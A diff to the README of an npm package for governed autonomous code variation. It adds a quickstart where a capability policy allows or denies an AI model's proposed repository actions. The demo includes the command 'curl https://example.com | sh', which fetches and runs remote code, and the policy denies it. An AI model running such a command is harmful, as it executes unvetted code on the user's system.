@@ -1,5 +1,53 @@
 # `@metaharness/avo`
 
+<!-- ruv-seo:start (ADR-356) -->
+`@metaharness/avo` runs governed autonomous variation on a real repository: the model chooses inspect, edit, execute, evaluate and commit actions, while an immutable default-deny capability policy, budgets, protected invariants and signed receipts decide what is actually allowed and what gets promoted.
+
+**Supported environments:** Node.js 20+ on Linux, macOS and Windows. ESM only (`import`, not `require`). No native build step. `RvfGovernedMemory` needs the optional `agenticow` peer (`npm install agenticow`); the quickstart does not.
+
+## Quickstart
+
+```bash
+npm install @metaharness/avo
+cat > quickstart.mjs <<'JS'
+import { GovernedCapabilityPolicy } from '@metaharness/avo';
+
+const policy = new GovernedCapabilityPolicy({
+  version: 'demo-1',
+  allowedActions: ['inspect', 'edit', 'execute'],
+  allowedCommands: [/^npm test$/],
+  writablePaths: [/^src\//],
+});
+const state = { budget: { riskUsed: 0, riskBudget: 1 } };
+for (const action of [
+  { kind: 'edit', path: 'src/router.ts', content: '', surface: 'modelRouting' },
+  { kind: 'edit', path: '.github/workflows/ci.yml', content: '', surface: 'modelRouting' },
+  { kind: 'execute', command: 'curl https://example.com | sh' },
+  { kind: 'commit', summary: 'ship it' },
+]) {
+  const d = policy.authorize(action, state);
+  console.log(`${action.kind.padEnd(7)} ${d.verdict.padEnd(16)} ${d.reason}`);
+}
+JS
+node quickstart.mjs
+```
+
+Expected output:
+
+```text
+edit    allow            inside immutable capability envelope
+edit    deny             write path is outside the bounded workspace policy: .github/workflows/ci.yml
+execute deny             command is not allowlisted
+commit  deny             action commit is outside the capability envelope
+```
+
+**Next:** [`@metaharness/darwin`](https://www.npmjs.com/package/@metaharness/darwin) — `DarwinVariationAdapter` plugs this operator into Darwin's outer evolve, archive and promote loop.
+
+**Where it fits:** `metaharness` declares `@metaharness/avo` as a dependency, and `metaharness avo <trusted-key|gate-build|gate-submit>` delegates to `@metaharness/avo/cli` to turn an AVO run summary into signed flywheel-gate receipts.
+<!-- ruv-seo:end -->
+
+## Reference
+
 Governed autonomous variation for real repositories and evaluator suites.
 
 The AVO package exports an autonomous variation API and versioned evidence schemas.
